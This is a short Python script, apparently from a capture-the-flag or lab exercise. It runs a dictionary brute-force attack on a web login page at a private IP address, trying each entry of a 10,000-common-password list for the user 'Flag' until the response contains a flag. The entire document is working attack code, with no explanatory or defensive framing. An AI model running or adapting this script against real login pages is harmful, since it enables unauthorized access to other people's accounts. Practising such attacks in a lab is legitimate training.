import requests

if __name__ == "__main__":
    username = "Flag"
    common_passwords = open("10k-most-common.txt", "r")
    for password in common_passwords:
        cleaned_pass = password.strip("\n")
        print(cleaned_pass)
        Url = f"http://192.168.38.130//index.php?page=signin&username={username}&password={cleaned_pass}&Login=Login#"
        r = requests.get(url=Url)
        page_content= r.text.lower()
        if "flag" in page_content:
            print(f"password : '{cleaned_pass}' gave the flag : {page_content[page_content.find("flag"):]}")
            break
